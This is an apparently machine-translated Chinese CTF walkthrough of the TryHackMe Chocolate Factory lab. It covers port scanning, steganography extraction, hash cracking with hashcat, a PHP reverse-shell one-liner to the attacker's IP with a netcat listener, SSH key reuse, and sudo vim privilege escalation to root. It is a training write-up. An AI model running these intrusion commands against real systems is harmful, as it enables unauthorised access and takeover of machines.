<html>
<head>
<title>TryHackMe: Chocolate Factory Write-up</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe:巧克力工厂报道</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-chocolate-factory-write-up-d430b53f7cb2?source=collection_archive---------1-----------------------#2021-01-22">https://infosecwriteups.com/tryhackme-chocolate-factory-write-up-d430b53f7cb2?source=collection_archive---------1-----------------------#2021-01-22</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div class="gh gi jq"><img src="../Images/e8c2bccba800dff43cb007d45465327a.png" data-original-src="https://miro.medium.com/v2/resize:fit:300/format:webp/0*Xp_SrZM9W2uxSYgw.jpeg"/></div><figcaption class="jx jy gj gh gi jz ka bd b be z dk translated">简单级CTF挑战</figcaption></figure><p id="f258" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">我们启动<a class="ae kz" href="https://tryhackme.com/room/chocolatefactory" rel="noopener ugc nofollow" target="_blank">机</a>开始黑吧！！！。</p><p id="2b3f" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">连接到您的OpenVPN网络并部署机器。</p><h2 id="6b23" class="la lb it bd lc ld le dn lf lg lh dp li km lj lk ll kq lm ln lo ku lp lq lr ls bi translated">任务2挑战</h2><p id="c677" class="pw-post-body-paragraph kb kc it kd b ke lt kg kh ki lu kk kl km lv ko kp kq lw ks kt ku lx kw kx ky im bi translated">让我们从查找开放端口的Rustscan开始</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="7f36" class="la lb it md b gy mh mi l mj mk">rustscan -a &lt;machine_ip&gt;</span></pre><figure class="ly lz ma mb gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi ml"><img src="../Images/98dde3d3e76705361d132945658b4543.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ESkql1p7OUBnMENyu__mew.png"/></div></div></figure><p id="04aa" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">让我们打开端口80(http)。它看起来像一个登录页面。</p><figure class="ly lz ma mb gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi mq"><img src="../Images/335fc8b01103e54a431ae5bc4e6f455a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yYsDTXBFg5bUaHJbimzL_w.png"/></div></div></figure><p id="529d" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">在ftp服务器中我们可以看到。jpg图片。</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="9215" class="la lb it md b gy mh mi l mj mk">ftp &lt;machine_ip&gt;</span></pre><figure class="ly lz ma mb gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi mr"><img src="../Images/c95db29026030ceec4be0f87eaa5e553.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5SPf_E8kx4AxrqoLhDW4ew.png"/></div></div></figure><figure class="ly lz ma mb gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi ms"><img src="../Images/db04ff6c0bc76e4536469472729cb841.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tGBJtkhwC3P_ihjkX4WVPw.png"/></div></div></figure><p id="3ac3" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">使用Steghide，我们可以从。jpg图片。</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="d304" class="la lb it md b gy mh mi l mj mk">steghide extract -sf &lt;file_name&gt;</span></pre><figure class="ly lz ma mb gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi mt"><img src="../Images/0c3c2ff619ddcb583de7dfb473353a5f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zyJDYXqwZhhS8p3bw6Bo4A.png"/></div></div></figure><p id="82aa" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">。txt文件看起来像base64加密文件</p><figure class="ly lz ma mb gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi mu"><img src="../Images/fcb7b21cb6af5b57e5e6cae9094dfee5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qwKvpDenEcbkos5V_yPbGw.png"/></div></div></figure><p id="1c24" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">使用base64工具，我们可以解密文本。</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="0d8f" class="la lb it md b gy mh mi l mj mk">base64 -d b64.txt</span></pre><p id="0baf" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">该文件包含用户名和密码散列。尤其是我们需要查理的密码散列。</p><figure class="ly lz ma mb gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi mv"><img src="../Images/688332f62df68a633ff491da709b47e8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*maH4JPKF-Qivmltd7yy1ZA.png"/></div></div></figure><p id="4e22" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">要破解密码散列，让我们使用Hashcat。我复制了哈希值并将其存储在hashes.txt文件中</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="949a" class="la lb it md b gy mh mi l mj mk">hashcat -a 0 -m 1800 cracked.txt hashes.txt &lt;wordlist_file&gt; -O</span></pre><figure class="ly lz ma mb gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi mw"><img src="../Images/c2b3d8261bfbb4d9090412c06ac99781.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ejtwA8tTurnXC_rZjurhOw.png"/></div></div></figure><p id="d0ef" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">破解花了很长时间。</p><figure class="ly lz ma mb gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi mx"><img src="../Images/6aa43afdf75650f9aa8916c21c513607.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WRVRrrR60WLFfFvJ2BnNHA.png"/></div></div></figure><p id="ac81" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">使用我们得到的密码和用户名登录。它内部有一个命令执行块。</p><figure class="ly lz ma mb gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi my"><img src="../Images/fcd01fa9d8b858e9d18cd4981b7eaaf8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*59Jm6uNqPI7-F-tXmlW_Dw.png"/></div></div></figure><p id="41c9" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">要获得反向shell，请键入以下命令。</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="7e6a" class="la lb it md b gy mh mi l mj mk">php -r '$sock=fsockopen("&lt;your_ip_address&gt;",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></pre><p id="b835" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">同时要监听，请打开终端并键入以下Netcat命令。</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="f7dc" class="la lb it md b gy mh mi l mj mk">nc -lvp 4444</span></pre><figure class="ly lz ma mb gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi mz"><img src="../Images/ad925411d67adf21cda98459e65a43c9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CQ49g2Pk5hUkPYIwYUD7kA.png"/></div></div></figure><p id="b17c" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">我们可以看到几个文件。让我感兴趣的是《钥匙_rev_key》。当我查看文件时，我得到了第一张空白纸的钥匙。希望以后可能有用。</p><figure class="ly lz ma mb gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi na"><img src="../Images/43be660b2648077f9c8f1c5ab1dc9337.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Nh5vHmoBLtezAJol3PsEzg.png"/></div></div></figure><p id="45fa" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">前往charlie的文件夹，我们可以看到“user.txt”文件。但是因为我们是www-data用户而不是charlie。</p><figure class="ly lz ma mb gt ju gh gi paragraph-image"><div class="gh gi nb"><img src="../Images/af8977fa9fb603548366ec79212c894c.png" data-original-src="https://miro.medium.com/v2/resize:fit:802/format:webp/1*gXk2dsPBfjE3m3tX8jMVqg.png"/></div></figure><p id="eb90" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">我们可以使用teleport (RSA私钥)，以charlie的身份通过ssh登录。</p><p id="f7e6" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">复制传送中的内容并更改权限。</p><p id="ef58" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">使用下面的ssh命令打开终端。</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="ef75" class="la lb it md b gy mh mi l mj mk">chmod 400 teleport<br/>ssh charlie@&lt;machine_ip&gt; -i teleport</span></pre><figure class="ly lz ma mb gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi nc"><img src="../Images/5ef19e6333d4e01b7b34c39e56320277.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XYpt9KUfvZl41jfhoOBHbQ.png"/></div></div></figure><p id="61fb" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">我们得到了用户标志</p><figure class="ly lz ma mb gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi nd"><img src="../Images/49c519f3879d480a18c6da052077149f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0XbHs6E4Ctm3lsA8vFHxpQ.png"/></div></div></figure><p id="0d50" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">现在，让我们将我们的权限提升到root用户，以找到根标志。</p><pre class="ly lz ma mb gt mc md me mf aw mg bi"><span id="fc38" class="la lb it md b gy mh mi l mj mk">sudo -l</span></pre><figure class="ly lz ma mb gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi ne"><img src="../Images/0b8e56ae62bb56f01ad5ec4ad53dd915.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FTqmm7LsPTbkX7UBkWY8ww.png"/></div></div></figure><p id="d49c" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">使用vim ( <a class="ae kz" href="https://medium.com/@pettyhacks/linux-privilege-escalation-via-vi-36c00fcd4f5e" rel="noopener">参考</a>)我们可以得到根。</p><figure class="ly lz ma mb gt ju gh gi paragraph-image"><div class="gh gi nf"><img src="../Images/514c6a1f48e31856bd944046a92221b1.png" data-original-src="https://miro.medium.com/v2/resize:fit:394/format:webp/1*IQKSNUZaxoM5XXyfd_0Y8g.png"/></div></figure><p id="ac4c" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">一旦我们执行了这个命令，我们现在就是根用户了。前往根目录，我们可以找到一个名为root.py的python文件。</p><p id="4412" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">它想要一把钥匙。我输入了我们最初找到的钥匙。</p><figure class="ly lz ma mb gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi ng"><img src="../Images/53d00e30882c5c39624ba1c48e0a5e50.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*D6xEeCNVyWjRXZ02NiEAtg.png"/></div></div><figcaption class="jx jy gj gh gi jz ka bd b be z dk translated">根标志</figcaption></figure><p id="f856" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">最后我们还拿到了根旗！！！。</p></div><div class="ab cl nh ni hx nj" role="separator"><span class="nk bw bk nl nm nn"/><span class="nk bw bk nl nm nn"/><span class="nk bw bk nl nm"/></div><div class="im in io ip iq"><p id="7e67" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">做这个挑战很有趣。希望大家学到新东西:)。</p><p id="1a06" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">通过<a class="ae kz" href="https://www.linkedin.com/in/vishnuram-r/" rel="noopener ugc nofollow" target="_blank"> Linkedin </a>和<a class="ae kz" href="https://vishnuram1999.github.io/" rel="noopener ugc nofollow" target="_blank">我的网站</a>和我联系。</p></div></div>    
</body>
</html>